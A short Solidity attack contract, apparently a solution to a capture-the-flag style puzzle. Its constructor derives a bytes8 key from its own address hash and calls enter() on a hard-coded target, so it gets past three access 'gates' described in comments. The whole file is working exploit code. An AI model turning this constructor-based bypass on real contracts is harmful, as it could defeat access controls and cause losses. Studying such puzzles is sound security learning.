
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

contract attack {
    address public target = 0x7532b1fbEd4b5ea28832A5709925153A60acCfE8;
    bytes8 key;
    constructor() {
        // gate 1: require the msg.sender is a contract
        // gate 2: require the msg.sender can't contain any code, therefore, either a address or call from a constructor
        // gate 3: some basic numerical calculation
        key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        (bool result,)=target.call(abi.encodeWithSignature("enter(bytes8)",key));
    }
}
